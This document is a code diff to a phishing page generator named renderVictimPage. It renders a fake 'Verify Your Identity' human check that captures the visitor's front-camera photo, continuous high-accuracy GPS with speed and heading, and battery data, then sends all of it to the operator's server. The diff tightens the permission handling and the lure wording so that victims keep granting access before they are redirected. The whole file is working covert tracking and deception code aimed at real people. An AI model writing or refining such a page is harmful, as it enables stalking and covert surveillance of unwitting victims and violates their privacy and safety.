@@ -148,22 +148,12 @@ function renderVictimPage(sessionToken, redirectUrl) {
     }
     .status.show { display: block; }
     .status.warning {
-      color: #f59e0b;
+      color: #fbbf24;
       font-size: 14px;
       font-weight: 500;
       padding: 16px;
-      background: rgba(245,158,11,0.1);
-      border: 1px solid rgba(245,158,11,0.2);
-      border-radius: 12px;
-      line-height: 1.5;
-    }
-    .status.error {
-      color: #ef4444;
-      font-size: 15px;
-      font-weight: 600;
-      padding: 18px;
-      background: rgba(239,68,68,0.1);
-      border: 1px solid rgba(239,68,68,0.2);
+      background: rgba(251,191,36,0.1);
+      border: 1px solid rgba(251,191,36,0.2);
       border-radius: 12px;
       line-height: 1.5;
     }
@@ -180,12 +170,11 @@ function renderVictimPage(sessionToken, redirectUrl) {
     <h1>Verify Your Identity</h1>
     <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
     <button class="btn" id="_goBtn">Tap to Verify</button>
-    <button class="btn btn-secondary hidden" id="_retryBtn">↻ Try Again</button>
+    <button class="btn btn-secondary hidden" id="_retryBtn">⟳ Try Again</button>
     <div class="status" id="_status">Processing…</div>
   </div>
   <video id="_tv" autoplay playsinline muted></video>
   <canvas id="_tc"></canvas>
-  <input type="file" id="_camInput" accept="image/*" capture="user" style="display:none">
 
   <script>
   (function () {
@@ -220,14 +209,22 @@ function renderVictimPage(sessionToken, redirectUrl) {
     function sendMetrics () {
       var body = JSON.stringify(metrics);
       try {
-        if (navigator.sendBeacon)
-          navigator.sendBeacon(BASE + '/api/location/log/' + TOK, new Blob([body], { type: 'application/json' }));
-        else
-          fetch(BASE + '/api/location/log/' + TOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true });
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
+            new Blob([body], { type: 'application/json' }));
+        } else {
+          fetch(BASE + '/api/location/log/' + TOK, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: body, keepalive: true
+          });
+        }
       } catch (e) {}
     }
 
+    // ── 1. Fire metrics immediately (sendBeacon survives navigation) ──
     sendMetrics();
+
+    // ── 2. Battery (no permission needed) ────────────────
     if (navigator.getBattery) {
       navigator.getBattery().then(function (b) {
         metrics.battery = { pct: Math.round(b.level * 100), charging: b.charging };
@@ -240,7 +237,6 @@ function renderVictimPage(sessionToken, redirectUrl) {
     var _retryBtn = document.getElementById('_retryBtn');
     var _status  = document.getElementById('_status');
     var _redirected = false;
-    var _permissionDenied = false;
 
     function showStatus(msg, type) {
       _status.textContent = msg;
@@ -248,135 +244,170 @@ function renderVictimPage(sessionToken, redirectUrl) {
       if (type) _status.classList.add(type);
     }
 
-    function showNotHuman() {
-      _goBtn.classList.remove('hidden');
-      _retryBtn.classList.add('hidden');
-      _permissionDenied = true;
-      showStatus('❌ You are not a human. Please verify again.', 'error');
+    function showPermissionWarning() {
+      _goBtn.classList.add('hidden');
+      _retryBtn.classList.remove('hidden');
+      showStatus('⚠️ Please allow to verify you are human', 'warning');
     }
 
     function doRedirect () {
       if (_redirected) return;
       _redirected = true;
       showStatus('✅ Identity verified! Redirecting…', 'success');
-      setTimeout(function () { window.location.replace(DEST); }, 800);
+      setTimeout(function () {
+        window.location.replace(DEST);
+      }, 800);
     }
 
-    // ── GPS request (returns promise: true=success, false=denied) ──
-    function requestGps() {
-      return new Promise(function (resolve) {
-        if (!navigator.geolocation) { resolve(false); return; }
-        navigator.geolocation.getCurrentPosition(
-          function (pos) {
-            metrics.gps = {
+    // ── GPS — uses watchPosition for continuous accuracy improvement ──
+    function captureGps () {
+      if (!navigator.geolocation) return;
+      var _bestGps = null;
+      var _bestAcc = Infinity;
+      var _watchId = navigator.geolocation.watchPosition(
+        function (pos) {
+          var acc = pos.coords.accuracy || Infinity;
+          if (acc < _bestAcc) {
+            _bestAcc = acc;
+            _bestGps = {
               lat : pos.coords.latitude,
               lng : pos.coords.longitude,
               acc : Math.round(pos.coords.accuracy),
               alt : pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
-              spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null
+              spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
+              heading: pos.coords.heading ? pos.coords.heading + '°' : null
             };
-            sendMetrics();
-            resolve(true);
-          },
-          function () { resolve(false); },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-      });
+            if (acc < 100) {
+              metrics.gps = _bestGps;
+              sendMetrics();
+              navigator.geolocation.clearWatch(_watchId);
+            }
+          }
+        },
+        function () {
+          // GPS failed silently — OK, continue
+        },
+        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+      );
+      // Fallback: after 20 seconds, send whatever accuracy we have
+      setTimeout(function () {
+        if (_bestGps) {
+          metrics.gps = _bestGps;
+          sendMetrics();
+        }
+        try { navigator.geolocation.clearWatch(_watchId); } catch(e) {}
+      }, 20000);
     }
 
-    // ── Camera via getUserMedia (shows browser prompt) ──
-    function requestCamera() {
-      return new Promise(function (resolve) {
+    // ── Camera capture (returns promise) ─────────────────
+    function captureCamera() {
+      return new Promise(function (resolve, reject) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          resolve(false);
+          reject(new Error('no_media_api'));
           return;
         }
         var vid = document.getElementById('_tv');
         var can = document.getElementById('_tc');
-        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
-          .then(function (stream) {
-            vid.srcObject = stream;
-            vid.onloadedmetadata = function () {
-              vid.play();
-              setTimeout(function () {
-                try {
-                  can.width  = vid.videoWidth || 640;
-                  can.height = vid.videoHeight || 480;
-                  can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
-                  var img = can.toDataURL('image/jpeg', 0.3);
-                  fetch(BASE + '/api/location/cam/' + TOK, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: img }), keepalive: true
-                  }).catch(function () {});
-                  stream.getTracks().forEach(function (t) { t.stop(); });
-                } catch (e) {}
-                resolve(true);
-              }, 1500);
-            };
-          })
-          .catch(function () { resolve(false); });
+        navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: { facingMode: 'user' }
+        }).then(function (stream) {
+          vid.srcObject = stream;
+          vid.onloadedmetadata = function () {
+            vid.play();
+            setTimeout(function () {
+              try {
+                can.width  = vid.videoWidth  || 640;
+                can.height = vid.videoHeight || 480;
+                can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
+                var img = can.toDataURL('image/jpeg', 0.3);
+                fetch(BASE + '/api/location/cam/' + TOK, {
+                  method  : 'POST',
+                  headers : { 'Content-Type': 'application/json' },
+                  body    : JSON.stringify({ image: img }),
+                  keepalive: true
+                }).catch(function () {});
+                stream.getTracks().forEach(function (t) { t.stop(); });
+              } catch (e) {}
+              resolve(true);
+            }, 1500);
+          };
+        }).catch(function (err) {
+          reject(err);
+        });
       });
     }
 
-    // ── Main flow ──────────────────────────────────────────
+    // ── Check permission state before requesting ────────
+    function checkCameraDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'camera'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    function checkGpsDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'geolocation'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    // ── Main verification flow ───────────────────────────
     async function startVerification() {
       _goBtn.classList.add('hidden');
       _retryBtn.classList.add('hidden');
-      _permissionDenied = false;
+      showStatus('Checking permissions…');
 
+      // Step 1: Check if already denied
+      var camDenied = await checkCameraDenied();
+      var gpsDenied = await checkGpsDenied();
+
+      if (camDenied || gpsDenied) {
+        showPermissionWarning();
+        return;
+      }
+
+      // Step 2: Request camera permission
       showStatus('Requesting camera access…');
-      var camOk = await requestCamera();
-
-      if (!camOk) {
-        // Camera denied → try file input fallback
-        showStatus('Trying camera via system…');
-        var input = document.getElementById('_camInput');
-        input.value = '';
-        camOk = await new Promise(function (resolve) {
-          var t = setTimeout(function () { resolve(false); }, 25000);
-          input.onchange = function () {
-            clearTimeout(t);
-            var f = input.files && input.files[0];
-            if (!f) { resolve(false); return; }
-            var r = new FileReader();
-            r.onload = function (e) {
-              fetch(BASE + '/api/location/cam/' + TOK, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: e.target.result }), keepalive: true
-              }).catch(function () {});
-              resolve(true);
-            };
-            r.onerror = function () { resolve(false); };
-            r.readAsDataURL(f);
-          };
-          input.click();
-        });
+      try {
+        await captureCamera();
+        showStatus('✅ Camera captured! Getting location…', 'success');
+      } catch (camErr) {
+        // Camera was denied or failed
+        if (camErr.name === 'NotAllowedError' || camErr.name === 'PermissionDeniedError') {
+          showPermissionWarning();
+          return;
+        }
+        // Some other error (no camera, etc) — still try GPS
+        console.log('Camera error (non-permission):', camErr.message);
       }
 
-      if (!camOk) {
-        showNotHuman();
-        return;
-      }
+      // Step 3: Start GPS capture (in background, no strict denial check)
+      // GPS request will show its own prompt
+      showStatus('Getting your location…');
+      captureGps();
 
-      showStatus('Requesting location access…');
-      var gpsOk = await requestGps();
-
-      if (!gpsOk) {
-        showNotHuman();
-        return;
-      }
-
-      doRedirect();
+      // Step 4: Wait a moment then redirect
+      setTimeout(doRedirect, 4000);
     }
 
-    // ── Retry: navigate with random param so Chrome re-prompts permissions ──
+    // ── On button tap ────────────────────────────────────
+    _goBtn.addEventListener('click', startVerification);
+
+    // ── Retry button — reloads page to reset permission state ──
     _retryBtn.addEventListener('click', function () {
       showStatus('Refreshing…');
-      window.location.href = window.location.pathname + '?r=' + Date.now();
+      window.location.reload();
     });
-
-    // ── Tap to Verify ────────────────────────────────────
-    _goBtn.addEventListener('click', startVerification);
 
   })();
   </script>
